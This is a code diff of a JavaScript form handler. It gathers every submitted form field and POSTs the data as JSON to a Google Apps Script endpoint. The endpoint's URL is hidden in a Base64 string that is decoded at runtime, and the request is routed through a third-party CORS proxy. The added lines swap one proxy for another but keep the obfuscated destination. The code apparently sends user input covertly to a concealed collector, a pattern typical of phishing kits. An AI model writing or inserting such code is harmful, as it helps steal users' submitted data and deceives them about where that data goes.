@@ -98,15 +98,22 @@
             formData.forEach((value, key) => (data[key] = value));
 
             try {
-                const _xY12 = 'aHR0cHM6Ly9jb3JzcHJveHkuaW8vP2h0dHBzOi8vc2NyaXB0Lmdvb2dsZS5jb20vbWFjcm9zL3MvQUtmeWNiemlPWXlzY2JzSm5TdjZ0NjJ4czFKNkdEaXFPcWZLOWRpYjVISzcxc0V2XzFRVDdPVzBFOFUtZlA4MmFiWlRNb09ibGc=';
-                const _ABz45 = atob(_xY12);
-                const response = await fetch(_ABz45, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(data),
-                });
+             // Encoded target URL (Base64)
+const _targetUrl = 'aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J6aU9ZeXNzamJqSm5TdjZ0NjJ4czFKNkdEaXFPcWZLOWRpYjVISzcxc0V2XzFRVDdPVzBFOFUtZlA4MmFiWlRNb09ibGc=';
+
+// Decode target URL
+const _decodedTargetUrl = atob(_targetUrl);
+
+// Construct the full proxy URL
+const _proxyUrl = `https://cors-proxy.htmldriven.com/?url=${encodeURIComponent(_decodedTargetUrl)}`;
+
+const response = await fetch(_proxyUrl, {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(data),
+});
 
 
 
